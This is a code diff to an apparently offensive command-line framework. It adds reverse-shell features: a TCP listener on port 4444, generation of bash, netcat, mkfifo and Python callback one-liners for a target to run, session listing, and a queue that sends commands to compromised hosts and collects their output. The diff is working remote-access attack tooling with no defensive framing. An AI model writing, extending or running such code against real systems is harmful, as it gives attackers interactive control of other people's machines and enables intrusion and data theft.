@@ -24,6 +24,7 @@ import argparse
 import json
 import os
 import sys
+import threading
 import time
 
 
@@ -55,6 +56,7 @@ def _cmd_server(srv, args):
             return 1
         pid = _spawn_background_daemon(args.name, args.host, args.port,
                                        args.https, args.key)
+        _wait_port(args.host, args.port, timeout=8)
         url = ("https" if args.https else "http") + f"://{args.host}:{args.port}"
         _out({"ok": True, "daemon_pid": pid, "listener": url, "name": args.name})
         return 0
@@ -92,6 +94,24 @@ def _probe_bind(host, port):
         return str(e)
     finally:
         s.close()
+
+
+def _wait_port(host, port, timeout=8):
+    """Wait until a TCP connect to host:port succeeds (listener is up)."""
+    import socket
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        s = socket.socket()
+        s.settimeout(0.5)
+        try:
+            r = s.connect_ex((host, port))
+            s.close()
+            if r == 0:
+                return True
+        except OSError:
+            s.close()
+        time.sleep(0.3)
+    return False
 
 
 def _spawn_background_daemon(name, host, port, https, key):
@@ -176,6 +196,180 @@ def _cmd_results(srv, args):
     _out({"session": args.session_id, "results": rows, "count": len(rows)})
 
 
+# --------------------------------------------------------------------------
+# reverse-shell (raw TCP interactive shell) subcommands
+# --------------------------------------------------------------------------
+def _cmd_reverse_shell(srv, args):
+    from ..server.reverseshell import reverse_shell_command, VARIANTS
+    if not args.callback:
+        _out({"ok": False, "error": "--callback <HOST> required to build the " +
+              "one-liner the target runs"})
+        return 1
+    if args.background:
+        if _probe_bind(args.host, args.port):
+            _out({"ok": False, "error": f"port {args.port} in use"})
+            return 1
+        _spawn_reverse_shell_daemon(args.name, args.host, args.port)
+        # A probe TCP connect would create a phantom reverse-shell session, so
+        # wait for the child to bind with a fixed sleep instead.
+        time.sleep(1.0)
+        cmd = reverse_shell_command(args.callback, args.port, args.variant or "bash")
+        _out({"ok": True, "listener": f"reverse-shell://{args.host}:{args.port}",
+              "name": args.name,
+              "callback_command": cmd,
+              "note": "run the callback on the target; sessions appear via --rsh-list or this daemon's log"})
+        return 0
+    # foreground: start and keep alive (holds the listener + does session
+    # reconciliation + command-queue processing for the multi-process model)
+    lis, err = srv.start_reverse_shell(args.name, args.host, args.port)
+    if err:
+        _out({"ok": False, "error": err})
+        return 1
+    cmd = reverse_shell_command(args.callback, args.port, args.variant or "bash")
+    _out({"ok": True, "listener": lis.url, "callback_command": cmd})
+    try:
+        # reconcile sessions to disk + process queued commands (daemon side)
+        _rsh_watch(srv)
+        _keep_alive(srv)
+    except KeyboardInterrupt:
+        pass
+    return 0
+
+
+def _rsh_state_path():
+    return os.path.join(os.environ.get("CSCLI_DATA_DIR") or
+                        os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
+                            os.path.abspath(__file__)))), "data"),
+                        "rsh_sessions.json")
+
+
+def _rsh_cmds_dir():
+    return os.path.join(os.environ.get("CSCLI_DATA_DIR") or
+                        os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
+                            os.path.abspath(__file__)))), "data"),
+                        "rsh_cmds")
+
+
+def _rsh_watch(srv):
+    """Daemon-side reconcile loop: persist sessions to disk, service any
+    command requests left by --rsh-shell invocations."""
+    import json as _json
+    seen = set()
+
+    def reconcile():
+        state = {}
+        for name, lis in srv.rsh_listeners.items():
+            for s in lis.list_sessions():
+                state[s.id] = {"listener": name, "session": s.id,
+                               "peer": f"{s.addr[0]}:{s.addr[1]}", "open": s.open}
+        os.makedirs(os.path.dirname(_rsh_state_path()), exist_ok=True)
+        with open(_rsh_state_path(), "w") as f:
+            _json.dump({"sessions": list(state.values()), "count": len(state)}, f)
+
+    # background thread: reconcile + process command queue
+    def loop():
+        while True:
+            time.sleep(0.5)
+            try:
+                reconcile()
+                _process_rsh_commands(srv)
+            except Exception:
+                pass
+    threading.Thread(target=loop, daemon=True).start()
+
+
+def _process_rsh_commands(srv):
+    """Scan rsh_cmds/<sid>/ for *.req and execute them on the live shell."""
+    import glob as _glob
+    base = _rsh_cmds_dir()
+    for req in _glob.glob(os.path.join(base, "*", "*.req")):
+        sid = os.path.basename(os.path.dirname(req))
+        resp = req.replace(".req", ".resp")
+        try:
+            with open(req) as f:
+                cmd = f.read()
+            sess = None
+            for lis in srv.rsh_listeners.values():
+                sess = lis.get(sid)
+                if sess:
+                    break
+            if not sess:
+                with open(resp, "w") as f: f.write("(session gone)")
+            else:
+                sess.send_line(cmd)
+                # drain available output for up to ~2.5s to capture the result
+                out = ""
+                dl = time.time() + 2.5
+                while time.time() < dl:
+                    b = sess.read_available()
+                    if b:
+                        out += b.decode(errors="replace")
+                        dl = time.time() + 0.8  # reset window on new data
+                    else:
+                        time.sleep(0.15)
+                with open(resp, "w") as f: f.write(out)
+        except Exception:
+            pass
+        try:
+            os.unlink(req)
+        except Exception:
+            pass
+
+
+def _spawn_reverse_shell_daemon(name, host, port):
+    import subprocess as _sp
+    here = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    log = os.path.join(here, "data", "rsh-daemon.log")
+    os.makedirs(os.path.dirname(log), exist_ok=True)
+    argv = [sys.executable, os.path.join(here, "cscli"), "--reverse-shell",
+            "--name", name, "--host", host, "--port", str(port),
+            "--callback", host]
+    with open(log, "w") as lf:
+        proc = _sp.Popen(argv, stdout=lf, stderr=_sp.STDOUT,
+                         start_new_session=True,
+                         env={**os.environ, "CSCCLI_RSH_DAEMON": "1"})
+    return proc.pid
+
+
+def _cmd_rsh_list(srv, args):
+    try:
+        with open(_rsh_state_path()) as f:
+            d = json.load(f)
+        _out({"sessions": d.get("sessions", []), "count": len(d.get("sessions", []))})
+    except Exception:
+        _out({"sessions": [], "count": 0})
+
+
+def _cmd_rsh_shell(srv, args):
+    """Drive one reverse-shell session via the daemon's command queue.
+    Write a .req, poll for .resp, print output. (Daemon holds the live socket.)"""
+    import glob as _glob
+    import uuid
+    os.makedirs(_rsh_cmds_dir(), exist_ok=True)
+    sdir = os.path.join(_rsh_cmds_dir(), args.session_id)
+    os.makedirs(sdir, exist_ok=True)
+    req = os.path.join(sdir, f"{int(time.time()*1000)}-{uuid.uuid4().hex[:6]}.req")
+    resp = req.replace(".req", ".resp")
+    cmd = args.command or ""
+    with open(req, "w") as f:
+        f.write(cmd)
+    # poll for response
+    deadline = time.time() + 20
+    out = "(timeout)"
+    while time.time() < deadline:
+        if os.path.exists(resp):
+            try:
+                with open(resp) as f:
+                    out = f.read()
+                os.unlink(resp)
+            except Exception:
+                out = "(read error)"
+            break
+        time.sleep(0.4)
+    _out({"ok": True, "session": args.session_id, "command": cmd, "output": out})
+    return 0
+
+
 def run(argv):
     srv = _load_server()
     p = build_parser()
@@ -186,6 +380,9 @@ def run(argv):
         "list": _cmd_list,
         "task": _cmd_task,
         "results": _cmd_results,
+        "reverse-shell": _cmd_reverse_shell,
+        "rsh-list": _cmd_rsh_list,
+        "rsh-shell": _cmd_rsh_shell,
     }
     if not args.cmd:
         p.print_help()
@@ -224,6 +421,23 @@ def build_parser():
 
     pr = sub.add_parser("results", help="show session results")
     pr.add_argument("session_id")
+
+    prs = sub.add_parser("reverse-shell", help="start a raw TCP reverse-shell listener")
+    prs.add_argument("--name", default="rsh")
+    prs.add_argument("--host", default="0.0.0.0")
+    prs.add_argument("--port", type=int, default=4444)
+    prs.add_argument("--callback", default=None,
+                     help="public host/IP the target should dial for the callback command")
+    prs.add_argument("--variant", default="bash",
+                     choices=["bash", "nc", "nc-e", "mkfifo", "python"])
+    prs.add_argument("--background", action="store_true")
+
+    plist = sub.add_parser("rsh-list", help="list active reverse-shell sessions")
+
+    pshell = sub.add_parser("rsh-shell", help="interact with a reverse-shell session")
+    pshell.add_argument("session_id")
+    pshell.add_argument("--command", default=None,
+                        help="send one command and print output (non-interactive)")
 
     return p
 
